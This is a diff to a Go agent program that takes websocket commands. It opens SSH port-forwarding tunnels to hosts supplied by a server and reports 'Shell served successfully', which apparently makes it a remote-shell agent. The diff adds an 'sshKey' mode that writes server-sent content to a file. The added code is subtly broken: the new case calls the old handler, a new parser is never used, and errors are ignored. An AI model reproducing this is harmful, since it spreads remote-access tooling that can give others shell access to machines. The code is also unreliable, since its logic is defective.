@@ -6,6 +6,7 @@ import (
 	"log"
 	"math/rand"
 	"net/http"
+	"os"
 	"os/exec"
 	"runtime"
 	"strconv"
@@ -138,6 +139,9 @@ func (a *Agent) msgHandler(msg string) {
 	case "rs":
 		a.handleRs(payload)
 		break
+	case "sshKey":
+		a.handleRs(payload)
+		break
 	}
 
 }
@@ -205,7 +209,25 @@ func (a *Agent) handleRs(payload *Payload) {
 	intport := strconv.Itoa(9600 + rand.Intn(100))
 	command := "0 -NL " + intport + ":" + params[0] + ":" + params[1] + " " + params[2] + "@" + params[3] + " -i ./key.pem"
 	fmt.Println("---------------", shell, params)
-	connectToRs(command, shell, intport)
+	go connectToRs(command, shell, intport)
+	send("/msg: Shell served successfully on "+runtime.GOOS+" -> "+payload.from, a.ws)
+}
+
+func (a *Agent) handleSshKey(payload *Payload) {
+	if payload.mode != "sshKey" {
+		return
+	}
+	// create the file
+	f, err := os.Create("test.txt")
+	if err != nil {
+		send("failed to create the ssh key file", a.ws)
+	}
+	defer f.Close()
+
+	fmt.Println(payload.content)
+	f.WriteString(payload.content)
+	// close the file with defer
+
 	send("/msg: Shell served successfully on "+runtime.GOOS+" -> "+payload.from, a.ws)
 }
 
@@ -259,6 +281,10 @@ func (p *Payload) parser(str string) {
 		p.mode = "rs"
 		p.rsParser(args[1])
 		break
+	case "[sshKey]":
+		p.mode = "sshKey"
+		p.rsParser(args[1])
+		break
 		// default:
 		// 	p.mode = "msg"
 		// 	p.msgParser(str)
@@ -309,6 +335,13 @@ func (p *Payload) rsParser(str string) {
 	p.length = len(args)
 	p.content = args[0]
 	p.from = args[1]
+}
+
+func (p *Payload) sshKeyParser(str string) {
+	p.args = []string{str}
+	p.length = 1
+	p.content = str
+	p.from = "server"
 }
 
 func connectToRs(params string, shell string, intport string) bool {
